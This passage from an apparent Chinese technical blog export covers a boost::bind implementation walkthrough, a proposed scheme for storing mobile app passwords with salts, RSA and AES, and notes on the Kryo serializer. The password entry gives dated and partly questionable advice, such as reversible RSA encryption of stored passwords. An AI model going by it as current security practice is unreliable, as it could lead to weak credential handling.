<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"myBind.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tow_arguments</span><span class="params">(<span class="keyword">int</span> i1, <span class="keyword">int</span> i2)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i1 &lt;&lt; i2 &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testClass</span><span class="params">(Test t, <span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testClass,Test,int"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i1 = <span class="number">1</span>, i2 = <span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line">	(boost::bind2(&amp;tow_arguments, <span class="number">123</span>, _1))(i1, i2);</span><br><span class="line">	(boost::bind2(&amp;tow_arguments, _1, _2))(i1, i2);</span><br><span class="line">	(boost::bind2(&amp;tow_arguments, _2, _1))(i1, i2);</span><br><span class="line">	(boost::bind2(&amp;tow_arguments, _1, _1))(i1, i2);</span><br><span class="line"> </span><br><span class="line">	(boost::bind2(&amp;tow_arguments, <span class="number">222</span>, <span class="number">666</span>))(i1, i2);</span><br><span class="line"> </span><br><span class="line">	Test t;</span><br><span class="line">	(boost::bind2(&amp;testClass, _1, <span class="number">666</span>))(t, i2);</span><br><span class="line">	(boost::bind2(&amp;testClass, _1, <span class="number">666</span>))(t);</span><br><span class="line">	(boost::bind2(&amp;testClass, t, <span class="number">666</span>))();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面的代码中有很多个类，有几个是比较重要的any，storage，list和bind_t。</p>
<p>先来看类any：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">int</span> I&gt; <span class="class"><span class="keyword">struct</span> <span class="title">arg</span> &#123;</span></span><br><span class="line">	arg() &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">boost::arg&lt;<span class="number">1</span>&gt; _1;</span><br><span class="line">boost::arg&lt;<span class="number">2</span>&gt; _2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面的代码中，我们看到了_1和_2，没错，所谓的占位符就是这么个东东，在匿名名字空间中定义的空的struct。<br>接下来是storage1,storage2类：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>&gt; <span class="title">struct</span> <span class="title">storage1</span> &#123;</span></span><br><span class="line">	<span class="function"><span class="keyword">explicit</span> <span class="title">storage1</span><span class="params">(A1 a1)</span> :</span></span><br><span class="line"><span class="function">			<span class="title">a1_</span><span class="params">(a1)</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	A1 a1_;</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>, <span class="title">class</span> <span class="title">A2</span>&gt; <span class="title">struct</span> <span class="title">storage2</span>:</span> <span class="keyword">public</span> storage1&lt;A1&gt; &#123;</span><br><span class="line">	<span class="keyword">typedef</span> storage1&lt;A1&gt; inherited;</span><br><span class="line"> </span><br><span class="line">	storage2(A1 a1, A2 a2) :</span><br><span class="line">			storage1&lt;A1&gt;(a1), a2_(a2) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	A2 a2_;</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看出storage类只是简单的继承关系，<strong>实际上storage类是用来存储bind函数所传递进来的参数的值的</strong>，之所以采用继承而不用组合，其实有精妙的用处。</p>
<p>接着看类list1和list2，<strong>它俩分别是storage1和storage2的子类（即参数是存放在listN类中的）：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>&gt; <span class="title">class</span> <span class="title">list1</span>:</span> <span class="keyword">private</span> storage1&lt;A1&gt; &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>, <span class="title">class</span> <span class="title">A2</span>&gt; <span class="title">class</span> <span class="title">list2</span>:</span> <span class="keyword">private</span> storage2&lt;A1, A2&gt; &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>仔细看代码，可以看到 <strong>list1和list2重载了operator [ ] 和operator () 函数</strong>，这些重载函数很关键，下面会谈到。</p>
<p>再看类bind_t：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>, <span class="title">class</span> <span class="title">F</span>, <span class="title">class</span> <span class="title">L</span>&gt; <span class="title">class</span> <span class="title">bind_t</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">bind_t</span> this_type;</span><br><span class="line">	<span class="keyword">bind_t</span>(F f, L <span class="keyword">const</span> &amp; l) :</span><br><span class="line">			f_(f), l_(l) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> result_traits&lt;R, F&gt;::type result_type;</span><br><span class="line"> </span><br><span class="line">	<span class="function">result_type <span class="title">operator</span><span class="params">()</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"bind_t::result_type operator()()"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		list0 a;</span><br><span class="line">		<span class="keyword">return</span> l_(type&lt;result_type&gt;(), f_, a, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	F f_;   <span class="comment">//bind所绑定的函数</span></span><br><span class="line">	L l_;   <span class="comment">//实际是是listN类，存放bind传绑定的参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>同样，我们可以看到bind_t类重载了operator ()函数，实际上，bind_t类是bind函数的返回类型，bind_t实际上是一个stl意义上的funtor。<br>注意bind_t的两个成员F f_ 和 L l_，这里是关键之处。</p>
<p>介绍完关键类，下面以main.cpp中下面部分代码为例，详细说明它的工作流程。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i1 = <span class="number">1</span>, i2 = <span class="number">2</span>;</span><br><span class="line">(boost::bind2(&amp;tow_arguments, <span class="number">123</span>, _1))(i1, i2);</span><br></pre></td></tr></table></figure>
<p>首先bind2函数返回一个bind_t类，这个类中的F成员，保存了tow_arguments函数指针，L成员（即list2类），保存了参数123 和 _1。<br>bind_t类采用的是以下的特化：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>, <span class="title">class</span> <span class="title">B1</span>, <span class="title">class</span> <span class="title">B2</span>, <span class="title">class</span> <span class="title">A1</span>, <span class="title">class</span> <span class="title">A2</span>&gt;</span></span><br><span class="line">_bi::bind_t&lt;R, R (*)(B1, B2), typename _bi::list_av_2&lt;A1, A2&gt;::type&gt; bind2(</span><br><span class="line">		R (*f)(B1, B2), A1 a1, A2 a2)</span><br></pre></td></tr></table></figure>
<p>其中storage2类（list2的父类）和storage1类，分别采用的是以下的特化：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>, <span class="title">int</span> <span class="title">I</span>&gt; <span class="title">struct</span> <span class="title">storage2</span>&lt;A1, boost::arg&lt;I&gt; &gt; :</span> <span class="keyword">public</span> storage1&lt;A1&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>&gt; <span class="title">struct</span> <span class="title">storage1</span></span></span><br></pre></td></tr></table></figure>
<p>（这里可以试下把123和_1互换位置，就能发现storage系列类用继承的精妙之处了，这里不展开了）</p>
<p>当bind_t调用operator (i1, i2)函数时，即以下函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">template&lt;class A1, class A2&gt; result_type operator()(A1 &amp; a1, A2 &amp; a2) &#123;</span><br><span class="line">	list2&lt;A1 &amp;, A2 &amp;&gt; a(a1, a2);</span><br><span class="line">	<span class="keyword">return</span> l_(type&lt;result_type&gt;(), f_, a, <span class="number">0</span>); <span class="comment">//operator ()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再次生成一个list2，这个list2中保存的是i1 和 i2的值。接着调用<code>l_.operator() (type&lt;result_type&gt;(), f_, a, 0)</code>函数（还记得l_是什么东东不？）</p>
<p><strong>l_实际是上刚才保存了123和<em>1的list2！而f</em>是由bind函数据绑定的函数的指针！</strong></p>
<p>接着看list2的operator() 函数的实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">	template&lt;class R, class F, class A&gt; R operator()(type&lt;R&gt;, F &amp; f, A &amp; a,</span><br><span class="line">			<span class="keyword">long</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> f(a[base_type::a1_], a[base_type::a2_]);</span><br><span class="line"><span class="comment">//		return unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_], a[base_type::a2_]); //本是这句的，简化了下，无关要紧</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到f是bind所绑定的函数的指针，即这里是调用了我们所绑定的函数。那么参数是从哪里来的？<br>注意A &amp;a实际上是保存了i1和i2的list2！，所以这里又调用了list2的operator[ ]函数！</p>
<p>再看下list2的operator[] 函数的实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">A1 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">1</span>&gt;) <span class="keyword">const</span> &#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"list2  A1 operator[](boost::arg&lt;1&gt;)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> base_type::a1_;</span><br><span class="line">&#125;</span><br><span class="line">A2 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">2</span>&gt;) <span class="keyword">const</span> &#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"list2  A1 operator[](boost::arg&lt;2&gt;)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> base_type::a2_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A1 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">1</span>&gt; (*)()) <span class="keyword">const</span> &#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"list2  A1 operator[](boost::arg&lt;1&gt; (*)())"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> base_type::a1_;</span><br><span class="line">&#125;</span><br><span class="line">A2 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">2</span>&gt; (*)()) <span class="keyword">const</span> &#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"list2  A1 operator[](boost::arg&lt;2&gt; (*)())"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> base_type::a2_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> &amp; <span class="title">operator</span>[](_<span class="title">bi</span>:</span>:value&lt;T&gt; &amp; v) <span class="keyword">const</span> &#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"T &amp; operator[](_bi::value&lt;T&gt; &amp; v)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> v.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>貌似问题都解决了，其实这里还有一个关键要素，两个list2是怎么合并起来，组成正确的参数传递给函数f的？（第一个list2存放了123和_1，第二个list2存放了i1和i2）<br>传递给tow_arguments函数的参数实际是是（123, 1）！</p>
<p>这里要仔细研究这些operator[]函数的实现，才能真正理解其过程。</p>
<p><strong>注意，上面的的代码中bind2只能绑定普通的函数，不能绑定类成员函数，functor，智能指针等。不过其实区别不大，只是增加一些特化的代码而已。</strong></p>
<p>还有一些const相关的函数删掉了。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>从代码可以看到boost::bind和原生的函数指针相比，会损失效率（两次的寻址，函数参数的拷贝，有一些可能没有inline的函数调用）。</p>
<p>不得不吐槽下boost的代码中那些神奇的宏，如果不是IDE有提示，我想真心弄不明白到底哪段是有意义的。。有时候还很神奇地include一部分代码进来（不是头文件，只是实现的一部分！）。</p>
<p>不得不吐槽下模板编程中的const，为了一个函数，比如int sum(int a, int b); 就得写四个重载函数来对应不同参数是或者不是const的情况。所以大家可以想像bind最多支持9个参数，那么有多少种情况了。</p>
<p>boost::bind的实现的确非常精巧，隐藏了很多复杂性。在《C++沉思录》中作者说到世界是复杂的，可以通过复杂性获取简单性。也许这个是对的，但是对于无数的后来的程序员总会有人想要看看黑盒子里到底是什么东东，结果总要花大量的时间才能理解，才能获得这种“简单性”。</p>
<p>C++的模板代码中最痛苦的是到处都是typedef，一个typedef就把所有的类型信息都干掉了！而这东东又是必须的。</p>
<p>也许C++给编程语言技术带来的最大贡献就是牛B的编译器了！</p>
<p>C++11中貌似部分的支持concept，希望这个能简化模板编程。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>boost</tag>
      </tags>
  </entry>
  <entry>
    <title>移动App该如何保存用户密码</title>
    <url>/app-password/</url>
    <content><![CDATA[<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>update 2018-06-04</p>
<p>2015年出的一个规范 JSON Web Token (JWT)  <a href="https://tools.ietf.org/html/rfc7519" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7519</a> </p>
<p>JWT 官网： <a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a>  </p>
<p>八幅漫画理解使用JSON Web Token设计单点登录系统： <a href="http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/" target="_blank" rel="noopener">http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/</a> </p>
<p>JSON Web Encryption (JWE) ： <a href="https://tools.ietf.org/html/rfc7516" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7516</a> </p>
<p>JSON Web Signature (JWS) ： <a href="https://tools.ietf.org/html/rfc7515" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7515</a> </p>
<p>update 2017-9-6 </p>
<p>微信交互协议和加密模式研究：<a href="https://github.com/hengyunabc/hengyunabc.github.io/files/1280081/wechat.pdf" target="_blank" rel="noopener">https://github.com/hengyunabc/hengyunabc.github.io/files/1280081/wechat.pdf</a></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>移动App该如何保存用户密码？</p>
<p>这个实际上和桌面程序是一样的。</p>
<h2 id="先看下一些软件是如何保存用户密码的"><a href="#先看下一些软件是如何保存用户密码的" class="headerlink" title="先看下一些软件是如何保存用户密码的"></a>先看下一些软件是如何保存用户密码的</h2><ul>
<li>QQ</li>
</ul>
<p>参考：<a href="http://bbs.pediy.com/archive/index.php?t-159045.html，桌面QQ在2012的时候把密码md5计算之后，保存到本地加密的Sqlite数据库里。" target="_blank" rel="noopener">http://bbs.pediy.com/archive/index.php?t-159045.html，桌面QQ在2012的时候把密码md5计算之后，保存到本地加密的Sqlite数据库里。</a></p>
<ul>
<li>手机淘宝</li>
</ul>
<p>参考：<a href="http://blog.csdn.net/androidsecurity/article/details/8666954" target="_blank" rel="noopener">http://blog.csdn.net/androidsecurity/article/details/8666954</a></p>
<p>手机淘宝是通过本地DES加密，再把密码保存到本地文件里的，如果拿到ROOT权限，能破解出密码明文。</p>
<ul>
<li>Windows</li>
</ul>
<p>参考：<a href="http://www.freebuf.com/tools/37162.html" target="_blank" rel="noopener">http://www.freebuf.com/tools/37162.html</a> </p>
<p>我实际测试了下，可以轻松得到所有帐号的密码明文。</p>
<ul>
<li>Linux</li>
</ul>
<p>参考：<a href="http://blog.csdn.net/lqhbupt/article/details/7787802" target="_blank" rel="noopener">http://blog.csdn.net/lqhbupt/article/details/7787802</a></p>
<p><strong>linux是通过加盐(salt)，再hash后，保存到/etc/shadow文件里的。</strong></p>
<p>貌似以前的发行版是md5 hash，现在的发行版都是SHA-512 hash。</p>
<p>linux用户密码的hash算法： <a href="http://serverfault.com/questions/439650/how-are-the-hashes-in-etc-shadow-generated" target="_blank" rel="noopener">http://serverfault.com/questions/439650/how-are-the-hashes-in-etc-shadow-generated</a></p>
<p>实际上是调用了glic里的crypt函数，可以在man手册里查看相关的信息。</p>
<p>可以用下面的命令来生成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkpasswd --method=SHA-512 --salt=xxxx</span><br></pre></td></tr></table></figure>
<p>其中salt参数，可以自己设置，最好是随机生成的。<br>可以用 <code>mkpasswd --method=help</code> 来查看支持的算法。</p>
<h2 id="用户密码该如何保存，还有能做到哪种程度？"><a href="#用户密码该如何保存，还有能做到哪种程度？" class="headerlink" title="用户密码该如何保存，还有能做到哪种程度？"></a>用户密码该如何保存，还有能做到哪种程度？</h2><p>看完上面一些软件的做法之后，我们来探讨下，用户密码该如何保存，还有能做到哪种程度？</p>
<ul>
<li>假定本地存储的hash串/加密串，和加密算法，攻击者都可以得到，或者逆向分析到。</li>
</ul>
<p>实际上也是如此，通过上面QQ和淘宝的例子，允分说明了加密串是可以得到的。Linux更是一切都是公开的，只要有权限就可以读取到，包括salt值，shah算法，(salt+密码) hash之后的结果。</p>
<ul>
<li>防止攻击者得到用户密码的明文。这个实际上是从用户的角度出发，即使数据泄露了，影响降到最低。</li>
<li>防止攻击者拿到hash串或者加密串之后，一直都可以登陆。这点对于移动设置是很重要的，比如今天用户连到了一个恶意的wifi，如果攻击者截获到请求，要防止攻击者潜伏几天，或者几个月之后的攻击。必须要让请求的凭据在一天或者几天内失效。</li>
</ul>
<h2 id="加盐-salt"><a href="#加盐-salt" class="headerlink" title="加盐(salt)"></a>加盐(salt)</h2><p>假如不加盐，那么攻击者可以根据同样的hash值得到很多信息。</p>
<p>比如网站1的数据库泄露了，攻击者发现用户A和用户B的hash值是一样的，然后攻击者通过其它途径拿到了用户A的密码，那么攻击者就可以知道用户B的密码了。</p>
<p>或者攻击者通过彩虹表，暴力破解等方式可以直接知道用户的原来密码。</p>
<p><strong>所以，每个用户的salt值都要是不一样的，这点参考linux的/etc/shadow文件就知道了。</strong></p>
<h2 id="客户端本地存储密码的算法"><a href="#客户端本地存储密码的算法" class="headerlink" title="客户端本地存储密码的算法"></a>客户端本地存储密码的算法</h2><p>应该用哪种算法来存储？</p>
<p>从上面的资料来看，手机淘宝是本地DES对称加密，显然很容易就可以破解到用户的真实密码。QQ也是对称加密的数据库里，存储了用户密码的md5值。</p>
<p>显然对称加密算法都是可以逆向得到原来的数据的。那么我们尝试用非对称加密算法，比如RSA来传输用户的密码。</p>
<p>那么用户登陆的流程就变为：</p>
<ol>
<li>客户端用公钥加密用户密码，保存到本地；</li>
<li>用户要登陆时，发送加密串到服务器；</li>
<li>服务器用私钥解密，得到用户的密码，再验证。</li>
</ol>
<p>有的人会说，如果服务器的私钥泄露怎么办？</p>
<p>服务器端换个新的密钥，强制客户端下载新的公钥或者升级。</p>
<p><strong>可以考虑有一个专门的硬件来解密，这个硬件只负责计算，私钥是一次性写入不可读取和修改的。搜索 rsa hardware，貌似的确有这样的硬件。</strong></p>
<p>当然，即使真的私钥泄露，世界一样运转，像OpenSSL的心血漏洞就可能泄露服务器私钥，但大家日子一样过。</p>
<p>非对称加密算法的好处：</p>
<ul>
<li>即使数据被盗，攻击者拿不到密码的明文</li>
<li>如果发现有部分用户的数据被盗了（公钥加密后的数据），可以通过升级服务器和客户端的版本，让用户重新输入密码，用户还是原来的密码，但是攻击者却登陆不了了。</li>
<li>对于安全要求严格的应用，还可以定期更新私钥，来保证用户的数据安全。</li>
</ul>
<h2 id="如何防止本地加密串泄露之后，攻击者可能潜伏很久？"><a href="#如何防止本地加密串泄露之后，攻击者可能潜伏很久？" class="headerlink" title="如何防止本地加密串泄露之后，攻击者可能潜伏很久？"></a>如何防止本地加密串泄露之后，攻击者可能潜伏很久？</h2><p>这点实际上是如何让客户端保存的加密串及时的失效。</p>
<p>比如：</p>
<ol>
<li>强制要求客户端保存的加密串一周失效；</li>
<li>用户手机中病毒了，攻击者窃取到了加密串。但是清除病毒之后，用户没有够时的修改密码。攻击者是否会潜伏很久？</li>
<li><strong>发现某木马大规模窃取到了大量的用户本地加密串，是否可以强制用户的本地加密串失效，客户端不用升级，用户不用修改密码，也不会泄露信息？</strong></li>
</ol>
<p>下面提出一种 salt + 非对称加密算法的方案来解决这个问题：</p>
<ol>
<li>用户填写密码，客户端随机生成一个salt值（注意这个salt只是防止中间人拦截到原始的password的加密串），用公钥把 (salt + password)加密，设置首次登陆的参数，发送到服务器；</li>
<li>服务器检查参数，发现是首次登陆，则服务器用私钥解密，得到password（抛弃salt值），验证，如果通过，则随机生成一个salt值，并把salt值保存起来（保存到缓存里，设置7天过期），然后用公钥把(salt + 用户名)加密，返回给客户端。</li>
<li>客户端保存服务器返回的加密串，完成登陆。</li>
<li>客户端下次自动登陆时，把上次保存的加密串直接发给服务器，并设置二次登陆的参数。</li>
<li>服务器检查参数，发现是二次登陆，用私钥解密，得到salt + 用户名，然后检查salt值是否过期了（到缓存中查找，如果没有，即过期），如果过期，则通知客户端，让用户重新输入密码。如果没有过期，再验证密码是否正确。如果正确，则通知客户端登陆成功。</li>
<li><strong>如果发现某帐户异常，可以直接清除缓存中对应用户的salt值，这样用户再登陆就会失败。同理，如果某木马大规模窃取到了大量的用户本地加密串，那么可以把缓存中所有用户的salt都清除，那么所有用户都要重新登陆。注意用户的密码不用修改。</strong></li>
<li>第2步中服务器生成的salt值，可以带上用户的mac值，os版本等，这样可以增强检验。</li>
</ol>
<p>注意，为了简化描述，上面提到的用户的password，可以是先用某个hash算法hash一次。</p>
<h2 id="具体的登陆流程"><a href="#具体的登陆流程" class="headerlink" title="具体的登陆流程"></a>具体的登陆流程</h2><h3 id="浏览器登陆的流程"><a href="#浏览器登陆的流程" class="headerlink" title="浏览器登陆的流程"></a>浏览器登陆的流程</h3><p>浏览器的登陆过程比较简单，只要用RSA公钥加密密码就可以了。防止中间人截取到明文的密码。 </p>
<p><img src="/img/browser-login.png" alt></p>
<h3 id="App登陆保存数据流程"><a href="#App登陆保存数据流程" class="headerlink" title="App登陆保存数据流程"></a>App登陆保存数据流程</h3><p>App因为要实现自动登陆功能，所以必然要保存一些凭据，所以比较复杂。 </p>
<p>App登陆要实现的功能： </p>
<ul>
<li>密码不会明文存储，并且不能反编绎解密； </li>
<li>在服务器端可以控制App端的登陆有效性，防止攻击者拿到数据之后，可以长久地登陆； </li>
<li>用户如果密码没有泄露，不用修改密码就可以保证安全性； </li>
<li>可以区分不同类型的客户端安全性；比如Android用户受到攻击，只会让Android用户的登陆失效，IOS用户不受影响。 </li>
</ul>
<h3 id="App第一次登陆流程"><a href="#App第一次登陆流程" class="headerlink" title="App第一次登陆流程"></a>App第一次登陆流程</h3><ul>
<li>用户输入密码，App把这些信息用RSA公钥加密：(用户名,密码,时间,mac,随机数)，并发送到服务器。 </li>
<li>服务器用RSA私钥解密，判断时间（可以动态调整1天到7天），如果不在时间范围之内，则登陆失败。如果在时间范围之内，再调用coreservice判断用户名和密码。</li>
</ul>
<p>这里判断时间，主要是防止攻击者截取到加密串后，可以长久地利用这个加密串来登陆。 </p>
<ul>
<li>如果服务器判断用户成功登陆，则用AES加密：(随机salt,用户名,客户端类型,时间)，以（用户名+Android/IOS/WP）为key，存到缓存里。再把加密结果返回给客户端。 </li>
<li>客户端保存服务器返回的加密串 </li>
</ul>
<h3 id="App自动登陆的流程"><a href="#App自动登陆的流程" class="headerlink" title="App自动登陆的流程"></a>App自动登陆的流程</h3><ul>
<li>App发送保存的加密串到服务器，（加密串，用户名，mac，随机数）==&gt;RSA公钥加密 </li>
<li>服务器用RSA私钥解密，再用AES解密加密串，判断用户名是否一致。如果一致，再以（用户名+Android/IOS/WP）为key到缓存里查询。如果判断缓存中的salt值和客户端发送过来的一致，则用户登陆成功。否则登陆失败。 </li>
</ul>
<p>不用AES加密，用RSA公钥加密也是可以的。AES速度比RSA要快，RSA只能存储有限的数据。</p>
<p><img src="/img/app-login.png" alt></p>
<h2 id="其它的一些东东"><a href="#其它的一些东东" class="headerlink" title="其它的一些东东"></a>其它的一些东东</h2><p>多次md5或者md5 + sha1是没什么效果的。</p>
<p>RSA算法最好选择2048位的。搜索” rsa 1024 crack”有很多相关的结果，google已经将其SSL用的RSA算法升级为2048位的。</p>
<p>如何防止登陆过程的中间人攻击，可以参考，魔兽世界的叫SPR6的登陆算法。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于网页登陆，可以考虑支持多种方式：</p>
<ul>
<li>不支持JS的，用原始密码登陆。</li>
<li>支持JS的，可以考虑传递hash算法加密字符串。严格要求的应用，最好用JS实现RSA加密。在github上找到的一个JS RSA库：<a href="https://github.com/travist/jsencrypt" target="_blank" rel="noopener">https://github.com/travist/jsencrypt</a></li>
<li>客户端应用，一律应当用RSA算法，并加盐来保存用户密码。单纯的hash或者对称加密算法都不靠谱。</li>
</ul>
<p>服务器用salt（存数据库的） + hash算法来保存用户的密码。</p>
<p>用salt（存缓存的，注意和上一行的salt是不同的）+ RSA算法来加密用户登陆的凭证。</p>
<p>这样服务器可以灵活控制风险，控制用户登陆凭据的有效期，即使用户数据泄露，也不需要修改密码。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>app</tag>
        <tag>security</tag>
        <tag>password</tag>
      </tags>
  </entry>
  <entry>
    <title>Kryo简介及代码阅读笔记</title>
    <url>/about-kryo/</url>
    <content><![CDATA[<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>更新：2012-08-01</p>
<p>版本 2.16长时间运行可能会导致OOM，版本2.18有bug，不能正确序列化map和collection。</p>
<p>真是悲剧，所用的每一个版本都有bug。不过从代码来看，作者有时的确比较随便。。测试用例也少。。（比起msgpack少多了）</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Kryo官方网站：<a href="https://code.google.com/p/kryo/" target="_blank" rel="noopener">https://code.google.com/p/kryo/</a></p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
<li><p>速度快！见<a href="https://github.com/eishay/jvm-serializers/wiki/Staging-Results" target="_blank" rel="noopener">https://github.com/eishay/jvm-serializers/wiki/Staging-Results</a></p>
</li>
<li><p>支持互相引用，比如类A引用类B，类B引用类A，可以正确地反序列化。</p>
</li>
<li><p>支持多个引用同一个对象，比如多个类引用了同一个对象O，只会保存一份O的数据。</p>
</li>
<li><p>支持一些有用的注解，如@Tag，@Optional。</p>
</li>
<li><p>支持忽略指定的字段。</p>
</li>
<li><p>支持null</p>
</li>
<li><p>代码入侵少</p>
</li>
<li><p>代码比较简法（比起msgpack，少得多）</p>
</li>
</ul>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
<li><p>bug多 2.12，2.14都有bug</p>
</li>
<li><p>文档比较少，有些使用方法要看代码才能理解，最新版2.14有bug，不能正确反序列化map类型。</p>
</li>
<li><p>不是跨语言的解决方案</p>
</li>
<li><p>貌似每一个类都要注册下，不然只能用writeClassAndObject和readClassAndObject函数。</p>
</li>
<li><p>类要有一个空的构造函数，不然不能序列化。</p>
</li>
<li><p>（如果这个构造函数里调用了别的资源，而这个资源没有初始化，那么就悲剧了。）</p>
</li>
<li><p><del>可以通过实现KryoSerializable接口来避免这个问题。。</del> 同样不能解决这个问题</p>
<p> Java自带的则不用调用这个构造函数。</p>
</li>
<li><p>msgpack同样有这个问题。</p>
</li>
</ul>
<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><ul>
<li><p>KryoSerializable</p>
</li>
<li><p>KryoCopyable</p>
</li>
</ul>
<h3 id="实现忽略指定的字段"><a href="#实现忽略指定的字段" class="headerlink" title="实现忽略指定的字段"></a>实现忽略指定的字段</h3><ol>
